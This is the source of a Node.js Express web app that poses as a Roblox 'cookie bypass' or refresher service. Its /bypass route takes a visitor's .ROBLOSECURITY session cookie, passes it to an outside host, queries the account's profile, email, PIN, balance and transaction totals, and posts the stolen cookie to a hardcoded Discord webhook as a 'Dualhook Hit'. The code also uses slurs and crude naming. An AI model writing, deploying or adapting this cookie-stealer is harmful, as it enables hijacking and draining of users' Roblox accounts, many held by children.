const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));  // Serve static files (e.g., CSS, images)

app.set('view engine', 'ejs');  // Using EJS for templating
app.set('views', path.join(__dirname, 'views'));

app.get('/', (req, res) => {
    res.render('index', { name: 'grapebyapss', image: 'https://media.discordapp.net/attachments/1276003835743174712/1276562893852246056/blackmonukka_1024x1024.png?ex=66c9fb57&is=66c8a9d7&hm=0c77214005d4f4c1d74f9a81843eafd880dd28f893c8694e4a0e270cd46448bb&=&format=webp&quality=lossless' });
});

app.post('/bypass', async (req, res) => {
    const userUglyRobloxCookie = req.body.FuckYouBitch;
    const CondidoCookie = encodeURIComponent(userUglyRobloxCookie);

    try {
        const apiUrl = `http://newstargeted-api.lovestoblog.com/CookieChange/Api/Change.php?cookie=${CondidoCookie}`;
        const response = await axios.get(apiUrl);
        
        let cookieValue = '';
        if (response.data && response.data.Cookie) {
            cookieValue = response.data.Cookie;

            // Now proceed to make requests to Roblox APIs
            const headers = {
                'Cookie': `.ROBLOSECURITY=${cookieValue}`,
                'User-Agent': req.headers['user-agent']
            };

            // Making a series of requests to Roblox APIs
            const profileResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers });
            const emailResponse = await axios.get('https://accountsettings.roblox.com/v1/email', { headers });
            const pinResponse = await axios.get('https://auth.roblox.com/v1/account/pin', { headers });
            const creditResponse = await axios.get('https://billing.roblox.com/v1/credit', { headers });
            const sumResponse = await axios.get(`https://economy.roblox.com/v2/users/${profileResponse.data.UserID}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers });

            // Process the data as needed
            const profile = profileResponse.data;

            // Prepare the webhook data
            const webhookData = {
                username: "Cookie Refresher - Notifier",
                avatar_url: "https://cdnb.artstation.com/p/assets/images/images/046/334/795/20220214145542/smaller_square/serbianhero-uros-milincic-corazon.jpg?1644872142",
                embeds: [{
                    title: "🕯️ +1 Dualhook Hit",
                    type: "rich",
                    color: parseInt("00000", 16),
                    description: `**[Rolimons](https://www.rolimons.com/player/${profile.UserID}) | [Check Cookie](https://rblx-btools.com/copy.php?cookie=${cookieValue})**`,
                    url: `https://www.roblox.com/users/${profile.UserID}/profile`,
                    thumbnail: {
                        url: profile.ThumbnailUrl,
                    },
                    footer: {
                        text: "Cookie Refresher Dualhook Hit",
                        icon_url: "https://cdnb.artstation.com/p/assets/images/images/046/334/795/20220214145542/smaller_square/serbianhero-uros-milincic-corazon.jpg?1644872142",
                    },
                    fields: [{
                            name: "**Username**",
                            value: profile.UserName,
                            inline: true
                        },
                        // Add other fields here based on responses
                    ]
                }]
            };

            // Send to Discord (or any other service)
            await axios.post('https://discord.com/api/webhooks/1276562611961593856/_Up47pSm_cCyPniSzflqni7n1LwutJOmGIQ0F82XlDzCNfJ-5GzXmc6JvcpvF6PFEWbbL', webhookData);

            res.render('index', { name: 'GRapebypass', image: 'https://media.discordapp.net/attachments/1276003835743174712/1276562893852246056/blackmonukka_1024x1024.png?ex=66c9fb57&is=66c8a9d7&hm=0c77214005d4f4c1d74f9a81843eafd880dd28f893c8694e4a0e270cd46448bb&=&format=webp&quality=lossless', cookieValue });
        } else {
            res.render('index', { name: 'GRapebypass', image: 'https://media.discordapp.net/attachments/1276003835743174712/1276562893852246056/blackmonukka_1024x1024.png?ex=66c9fb57&is=66c8a9d7&hm=0c77214005d4f4c1d74f9a81843eafd880dd28f893c8694e4a0e270cd46448bb&=&format=webp&quality=lossless', error: 'Invalid .ROBLOSECURITY Cookie' });
        }

    } catch (error) {
        console.error('Error fetching data:', error);
        res.render('index', { name: 'GRapebypass', image: 'https://media.discordapp.net/attachments/1276003835743174712/1276562893852246056/blackmonukka_1024x1024.png?ex=66c9fb57&is=66c8a9d7&hm=0c77214005d4f4c1d74f9a81843eafd880dd28f893c8694e4a0e270cd46448bb&=&format=webp&quality=lossless', error: 'Invalid .ROBLOSECURITY Cookie' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
